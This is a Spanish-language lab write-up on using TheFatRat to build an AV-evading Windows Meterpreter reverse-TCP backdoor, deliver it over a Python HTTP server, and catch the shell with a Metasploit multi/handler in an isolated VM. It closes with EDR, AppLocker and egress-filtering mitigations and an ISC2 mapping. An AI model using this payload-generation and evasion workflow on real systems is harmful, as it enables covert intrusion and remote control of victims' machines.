# Generación de Payloads y Análisis de Evasión de AV con TheFatRat

**Plataforma:** Infraestructura Virtualizada Local (Entorno de Hipervisor Aislado)
**Dificultad:** Media
**Fecha:** 2026-11-07
**Categoría:** Red Teaming / Generación de Malware / Evasión Estática y Heurística

---

## 🎯 Objetivo
El objetivo de este laboratorio fue evaluar las capacidades de automatización del framework **TheFatRat** para generar backdoors multiplataforma, analizar los mecanismos de compilación y ofuscación que utiliza para evadir firmas estáticas de antivirus y verificar estrategias de detección defensiva frente a envolturas automatizadas de payloads.

##  Entorno y herramientas
- **Nodo Atacante:** Kali Linux Rolling Edition (`[IP_ATACANTE]`)
- **Nodo Víctima:** Windows 10 Pro — Entorno Aislado (`[IP_VÍCTIMA]`)
- **Herramientas Utilizadas:** TheFatRat (`screetsec/TheFatRat`), MSFvenom, Metasploit Framework (`multi/handler`), Servidor HTTP de Python3, Mingw-w64, Backdoor-Factory.

---

##  Procedimiento

### 1. Preparación del Entorno y Despliegue de la Herramienta
TheFatRat actúa como una interfaz automatizada sobre **MSFvenom** y diversos compiladores, agilizando la creación de ejecutables, scripts y documentos infectados para múltiples arquitecturas (Windows, Linux, macOS y Android).

```bash
# Clonar el repositorio oficial
git clone https://github.com
cd TheFatRat

# Otorgar permisos de ejecución y correr el script de dependencias
chmod +x setup.sh
./setup.sh
```

* **Verificación de Dependencias:** La rutina de instalación validó e instaló los compiladores cruzados necesarios (como `mingw-w64`), codificadores de payloads y utilidades requeridas para compilar binarios independientes sin errores de sintaxis.

---

### 2. Generación Automatizada de Payloads y Ofuscación
Una vez inicializado (`./fatrat`), se utilizó el menú interactivo del framework para crear un backdoor ejecutable personalizado para Windows, diseñado para evadir la detección básica basada en firmas.

1. **Selección de Vector:** Se eligió la opción de ejecutable compilado (`Create Backdoor with C / C# / PowerShell`) para envolver un payload estándar de shell reversa dentro de una nueva estructura binaria compilada.
2. **Parámetros de Red y Payload:**
   * **Payload:** `windows/x64/meterpreter/reverse_tcp`
   * **LHOST:** `[IP_ATACANTE]`
   * **LPORT:** `4444/5555`
3. **Mejoras de Evasión:** Se aplicaron técnicas integradas de ofuscación y manipulación de tamaño de archivo (*File Pumper*) para alterar la entropía del binario y dificultar la búsqueda por hashes estáticos.

---

### 3. Entrega del Payload mediante Servidor HTTP Local
Dado que la máquina víctima opera dentro de una red *Host-Only* aislada sin acceso externo a internet ni carpetas compartidas con el anfitrión, se levantó un servidor web temporal en la máquina atacante para transferir los archivos `.exe` generados a través del segmento local.

```bash
# Navegar al directorio de salida que contiene el payload .exe compilado
cd TheFatRat/output

# Iniciar un servidor HTTP temporal en el puerto 8000
python3 -m http.server 8000
```

* **Ejecución de la Transferencia:** Desde la máquina víctima de Windows 10, se abrió un navegador web apuntando directamente a `http://[IP_ATACANTE]:8000`, permitiendo descargar el binario `.exe` de forma local en el equipo objetivo. Una vez completada la transferencia, se detuvo el servidor HTTP.

---

### 4. Configuración del Listener y Verificación Post-Explotación
Con el payload alojado en el nodo víctima, se configuró un escuchador correspondiente en Metasploit para recibir la conexión reversa entrante.

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [IP_ATACANTE]
set LPORT 4444
exploit
```

* **Resultado Observado:** Al ejecutar el binario `.exe` descargado en el endpoint aislado de Windows 10, el payload evadió con éxito las comprobaciones estáticas base y estableció una conexión reversa activa, otorgando una sesión de **Meterpreter**.

---

## 📌 Hallazgos
* **Automatización de la Ofuscación:** Herramientas como TheFatRat reducen la barrera técnica para generar payloads mutados al automatizar la compilación en C/PowerShell, la inyección de shellcode y el relleno de archivos en un solo flujo de trabajo.
* **Limitaciones de las Firmas Estáticas:** Los motores antivirus estándar que dependen únicamente de hashes de archivos o firmas conocidas de plantillas de MSFvenom tienen dificultades para detectar binarios recién compilados si no cuentan con análisis de comportamiento activo.

## 🛡️ Mitigación / Remediación
1. **Monitoreo Heurístico y de Comportamiento (EDR):** Implementar soluciones de Detección y Respuesta en Endpoints (EDR) capaces de inspeccionar la inyección en memoria de procesos, procesos hijos anómalos y sockets de red no autorizados en tiempo de ejecución, en lugar de depender solo de escaneos estáticos en disco.
2. **Políticas de Control de Aplicaciones (AppLocker / WDAC):** Restringir la ejecución de binarios y scripts sin firmar originados desde directorios de usuario sin privilegios administrativos (como `Downloads`, `Temp` o `Desktop`).
3. **Filtrado de Tráfico de Red (Ingress / Egress):** Aplicar reglas estrictas de firewall interno en las estaciones de trabajo corporativas para bloquear transferencias HTTP no autorizadas desde hosts internos no aprobados y restringir conexiones TCP reversas salientes en puertos no estándar.

---

## 🎓 Alineación con los Dominios de ISC2 Certified in Cybersecurity (CC)

Este laboratorio práctico refuerza conceptos fundamentales de gobernanza, técnica y defensa mapeados en los dominios oficiales de la certificación **ISC2 CC**:

| Dominio ISC2 CC | Correlación con el Laboratorio y Aplicación Práctica |
| :--- | :--- |
| **Dominio 1: Principios de Seguridad** | Demuestra amenazas directas a la **Tríada CIA** (específicamente **Confidencialidad** e **Integridad**) cuando la ejecución remota de comandos compromete un host, así como la necesidad de **Gestión de Riesgos** para evaluar técnicas de evasión más allá de los controles básicos. |
| **Dominio 3: Conceptos de Control de Acceso** | Resalta la importancia del **Principio de Menor Privilegio** y el **Control de Aplicaciones (AppLocker)**; ejecutar un `.exe` no verificado bajo un contexto de usuario con privilegios otorga acceso inmediato y sin restricciones al sistema mediante Meterpreter. |
| **Dominio 4: Seguridad de Redes** | Ilustra la necesidad de la **Segmentación de Red** (aislando el laboratorio en una subred Host-Only) y las **Reglas de Firewall de Entrada/Salida** para bloquear transferencias internas de archivos HTTP no autorizadas (`8000/TCP`) y shells reversas salientes (`4444/TCP`). |
| **Dominio 5: Operaciones de Seguridad** | Subraya el requisito operativo de contar con **EDR**, **Registro y Monitoreo Continuo** y **Concientización en Seguridad** para detectar anomalías de comportamiento cuando las firmas estáticas de antivirus son evadidas. |

---

##  Lecciones aprendidas
* Los generadores automatizados de payloads dependen en gran medida de frameworks subyacentes como Metasploit; comprender los parámetros de compilación y codificación detrás de escena es esencial tanto para auditorías ofensivas como para redactar reglas de detección precisas.
* Cambiar el lenguaje o la envoltura del payload (por ejemplo, compilar la shellcode dentro de un binario personalizado en C) altera drásticamente la firma estática en comparación con los ejecutables crudos de MSFvenom.

---

## 🔗 Referencias
* Repositorio Oficial: [screetsec/TheFatRat](https://github.com)
* Documentación e Hitos del Proyecto: [TheFatRat Milestones](https://github.com)
* Marco de Certificación: [Esquema de Examen ISC2 Certified in Cybersecurity (CC)](https://isc2.org)
